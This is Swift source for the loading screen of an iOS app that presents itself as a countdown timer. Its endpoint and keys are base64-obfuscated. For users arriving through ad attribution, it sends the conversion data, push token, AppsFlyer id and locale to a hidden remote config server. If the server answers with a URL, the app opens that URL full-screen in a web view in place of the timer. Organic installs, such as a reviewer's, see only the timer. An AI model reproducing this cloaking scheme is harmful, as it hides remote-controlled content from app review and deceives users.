import SwiftUI
import Network
import Combine
import UserNotifications

private enum _S {
    @inline(__always) static func d(_ b64: String) -> String {
        guard let data = Data(base64Encoded: b64),
              let s = String(data: data, encoding: .utf8) else { return "" }
        return s
    }
}

private enum _K {
    static let lastDeniedKey   = _S.d("bGFzdE5vdGlmaWNhdGlvbkRlbmllZERhdGU=")
    static let cfgExpiresKey   = _S.d("Y29uZmlnX2V4cGlyZXM=")
    static let cfgUrlKey       = _S.d("Y29uZmlnX3VybA==")
    static let cfgNoMoreKey    = _S.d("Y29uZmlnX25vX21vcmVfcmVxdWVzdHM=")
    static let conversionData  = _S.d("Y29udmVyc2lvbl9kYXRh")

    
    static let pushToken       = _S.d("cHVzaF90b2tlbg==")
    static let afId            = _S.d("YWZfaWQ=")
    static let bundleId        = _S.d("YnVuZGxlX2lk")
    static let os              = _S.d("b3M=")
    static let storeId         = _S.d("c3RvcmVfaWQ=")
    static let locale          = _S.d("bG9jYWxl")
    static let fbProjectId     = _S.d("ZmlyZWJhc2VfcHJvamVjdF9pZA==")

    static let ok              = _S.d("b2s=")
    static let url             = _S.d("dXJs")
    static let expires         = _S.d("ZXhwaXJlcw==")

    
    static let bundleIdValue   = _S.d("Y29tLmFwcC5jb3VudGRvd250aW1lcnBsdXM=")
    static let osValue         = _S.d("aU9T")
    static let storeIdValue    = _S.d("Njc1ODM0NDkyNA==")
    static let fbProjectValue  = _S.d("NzM5OTIwOTU2MDA1")

    static let endpointB64     = _S.d("aHR0cHM6Ly9mcm9zdHRpbWVwbHVzLmNvbS9jb25maWcucGhw")

}

final class NetworkMonitor: ObservableObject {
    static let shared = NetworkMonitor()

    @Published private(set) var isDisconnected: Bool = false

    private let monitor = NWPathMonitor()
    private let queue = DispatchQueue(label: "NetworkMonitorQueue")

    private init() {
        monitor.pathUpdateHandler = { [weak self] path in
            DispatchQueue.main.async {
                self?.isDisconnected = (path.status != .satisfied)
            }
        }
        monitor.start(queue: queue)
    }
}

extension View {
    func outlineText(color: Color, width: CGFloat) -> some View {
        modifier(StrokeModifier(strokeSize: width, strokeColor: color))
    }
}

struct StrokeModifier: ViewModifier {
    private let id = UUID()
    var strokeSize: CGFloat = 1
    var strokeColor: Color = .blue

    func body(content: Content) -> some View {
        content
            .padding(strokeSize * 2)
            .background(
                Rectangle()
                    .foregroundStyle(strokeColor)
                    .mask { outline(symbol: content) }
            )
    }

    private func outline(symbol: Content) -> some View {
        Canvas { context, size in
            context.addFilter(.alphaThreshold(min: 0.01))
            context.drawLayer { layer in
                if let resolved = context.resolveSymbol(id: id) {
                    layer.draw(resolved, at: CGPoint(x: size.width / 2, y: size.height / 2))
                }
            }
        } symbols: {
            symbol
                .tag(id)
                .blur(radius: strokeSize)
        }
    }
}

struct URLModel: Identifiable, Equatable {
    let id = UUID()
    let urlString: String
}

private enum _CFG {
    @inline(__always)
    static func _finishNoConfig(_ finish: @escaping () -> Void) {
        DispatchQueue.main.async {
            UserDefaults.standard.set(true, forKey: _K.cfgNoMoreKey)
            UserDefaults.standard.synchronize()
            finish()
        }
    }

    static func send(_ finishNoConfig: @escaping () -> Void,
                     handle: @escaping ([String: Any]) -> Void) {

        if UserDefaults.standard.bool(forKey: _K.cfgNoMoreKey) {
            print("Config requests are disabled by flag, exiting sendConfigRequest")
            DispatchQueue.main.async { finishNoConfig() }
            return
        }

        guard let blob = UserDefaults.standard.data(forKey: _K.conversionData) else {
            print("Conversion data not found in UserDefaults")
            _finishNoConfig(finishNoConfig)
            return
        }

        guard var payload = (try? JSONSerialization.jsonObject(with: blob, options: [])) as? [String: Any] else {
            print("Failed to deserialize conversion data")
            _finishNoConfig(finishNoConfig)
            return
        }

        payload[_K.pushToken]   = UserDefaults.standard.string(forKey: "fcmToken") ?? ""
        payload[_K.afId]        = UserDefaults.standard.string(forKey: "apps_flyer_id") ?? ""
        payload[_K.bundleId]    = _K.bundleIdValue
        payload[_K.os]          = _K.osValue
        payload[_K.storeId]     = _K.storeIdValue
        payload[_K.locale]      = Locale.current.identifier
        payload[_K.fbProjectId] = _K.fbProjectValue

        do {
            let body = try JSONSerialization.data(withJSONObject: payload, options: [])

            guard let u = URL(string: _K.endpointB64) else {
                print("Invalid endpoint URL")
                _finishNoConfig(finishNoConfig)
                return
            }

            var req = URLRequest(url: u)
            req.httpMethod = "POST"
            req.setValue("application/json", forHTTPHeaderField: "Content-Type")
            req.httpBody = body

            URLSession.shared.dataTask(with: req) { data, response, error in
                if let error = error {
                    print("Request error: \(error)")
                    _finishNoConfig(finishNoConfig)
                    return
                }

                guard let http = response as? HTTPURLResponse else {
                    print("Invalid response")
                    _finishNoConfig(finishNoConfig)
                    return
                }

                guard (200...299).contains(http.statusCode) else {
                    print("Server returned status code \(http.statusCode)")
                    _finishNoConfig(finishNoConfig)
                    return
                }

                guard let data = data else {
                    print("Empty response body")
                    _finishNoConfig(finishNoConfig)
                    return
                }

                do {
                    if let json = try JSONSerialization.jsonObject(with: data, options: []) as? [String: Any] {
                        print("Config response JSON: \(json)")
                        DispatchQueue.main.async { handle(json) }
                    } else {
                        print("Unexpected JSON format")
                        _finishNoConfig(finishNoConfig)
                    }
                } catch {
                    print("Failed to parse response JSON: \(error)")
                    _finishNoConfig(finishNoConfig)
                }
            }.resume()

        } catch {
            print("Failed to serialize request body: \(error)")
            _finishNoConfig(finishNoConfig)
        }
    }
}

struct LoadingView: View {
    @Environment(\.scenePhase) private var scenePhase
    @State private var hasCheckedAuthorization = false

    @State var url: URLModel? = nil

    @Environment(\.verticalSizeClass) var verticalSizeClass
    @Environment(\.horizontalSizeClass) var horizontalSizeClass

    @State var conversionDataReceived: Bool = false
    @State var isNotif = false

    @State var isMain = false
    @State var isRequestingConfig = false

    @StateObject var networkMonitor = NetworkMonitor.shared
    @State var isInet = false

    @State private var hasHandledConversion = false
    @State var urlFromNotification: String? = nil

    var isPortrait: Bool { verticalSizeClass == .regular && horizontalSizeClass == .compact }
    var isLandscape: Bool { verticalSizeClass == .compact && horizontalSizeClass == .regular }

    var body: some View {
        VStack {
            if isPortrait {
                ZStack {
                    Image("loadport")
                        .resizable()
                        .ignoresSafeArea()

                    VStack(spacing: 150) {
                        Spacer()
                        VStack(spacing: 30) {
                            Spacer()
                            ProgressView()
                                .scaleEffect(3.0)
                                .padding(.top)
                                .tint(.white)
                            Spacer()
                        }
                    }
                    .padding(.vertical, 20)
                }
            } else {
                ZStack {
                    Image("loadland")
                        .resizable()
                        .ignoresSafeArea()

                    VStack(spacing: 10) {
                        Spacer()
                        ProgressView()
                            .scaleEffect(3.0)
                            .tint(.white)
                    }
                    .padding(.bottom, 80)
                }
            }
        }
        .onReceive(networkMonitor.$isDisconnected) { disconnected in
            if disconnected {
                isInet = true
            } else {
            }
        }
        .fullScreenCover(item: $url) { item in
            Egg(urlString: item.urlString)
                .onReceive(NotificationCenter.default.publisher(for: .openUrlFromNotification)) { notification in
                    if let userInfo = notification.userInfo,
                       let url = userInfo["url"] as? String {
                        urlFromNotification = url
                    }
                }
                .fullScreenCover(isPresented: Binding<Bool>(
                    get: { urlFromNotification != nil },
                    set: { newValue in if !newValue { urlFromNotification = nil } }
                )) {
                    if let urlToOpen = urlFromNotification {
                        Egg(urlString: urlToOpen)
                            .ignoresSafeArea()
                    } else {
                        EmptyView()
                    }
                }
                .ignoresSafeArea(.keyboard)
                .ignoresSafeArea()
        }
        .onReceive(NotificationCenter.default.publisher(for: .openUrlFromNotification)) { notification in
            if let userInfo = notification.userInfo,
               let url = userInfo["url"] as? String {
                urlFromNotification = url
            }
        }
        .fullScreenCover(isPresented: Binding<Bool>(
            get: { urlFromNotification != nil },
            set: { newValue in if !newValue { urlFromNotification = nil } }
        )) {
            if let urlToOpen = urlFromNotification {
                Egg(urlString: urlToOpen)
                    .ignoresSafeArea()
            } else {
                EmptyView()
            }
        }
        .onReceive(NotificationCenter.default.publisher(for: .datraRecieved)) { _ in
            DispatchQueue.main.async {
                guard !isInet else { return }
                if !hasHandledConversion {
                    let isOrganic = UserDefaults.standard.bool(forKey: "is_organic_conversion")
                    if isOrganic {
                        isMain = true
                    } else {
                        _a()
                    }
                    hasHandledConversion = true
                } else {
                    print("Conversion event ignored due to recent handling")
                }
            }
        }
        .onReceive(NotificationCenter.default.publisher(for: .notificationPermissionResult)) { _ in
            _r()
        }
        .fullScreenCover(isPresented: $isNotif) {
            NotificationView()
        }
        .fullScreenCover(isPresented: $isMain) {
            RootView()
                .environmentObject(CountdownListViewModel())
                .environmentObject(SettingsViewModel())
        }
        .fullScreenCover(isPresented: $isInet) {
            NoInternet()
        }
    }
}

extension LoadingView {

    private func _a() {
        UNUserNotificationCenter.current().getNotificationSettings { settings in
            switch settings.authorizationStatus {
            case .notDetermined:
                if _g() {
                    isNotif = true
                } else {
                    _r()
                }
            case .denied:
                _r()
            case .authorized, .provisional, .ephemeral:
                _r()
            @unknown default:
                _r()
            }
        }
    }

    private func _g() -> Bool {
        if let lastDenied = UserDefaults.standard.object(forKey: _K.lastDeniedKey) as? Date {
            let threeDaysAgo = Calendar.current.date(byAdding: .day, value: -3, to: Date())!
            return lastDenied < threeDaysAgo
        }
        return true
    }

    private func _r() {
        _CFG.send(
            { _f() },
            handle: { json in
                _h(json)
            }
        )
    }

    private func _h(_ jsonResponse: [String: Any]) {
        if let ok = jsonResponse[_K.ok] as? Bool, ok,
           let url = jsonResponse[_K.url] as? String,
           let expires = jsonResponse[_K.expires] as? TimeInterval {

            UserDefaults.standard.set(url, forKey: _K.cfgUrlKey)
            UserDefaults.standard.set(expires, forKey: _K.cfgExpiresKey)
            UserDefaults.standard.removeObject(forKey: _K.cfgNoMoreKey)
            UserDefaults.standard.synchronize()

            guard urlFromNotification == nil else { return }
            self.url = URLModel(urlString: url)
            print("Config saved: url = \(url), expires = \(expires)")

        } else {
            UserDefaults.standard.set(true, forKey: _K.cfgNoMoreKey)
            UserDefaults.standard.synchronize()
            print("No valid config or error received, further requests disabled")
            _f()
        }
    }

    private func _f() {
        DispatchQueue.main.asyncAfter(deadline: .now() + 2) {
            isMain = true
        }
    }
}

#Preview {
    LoadingView()
}
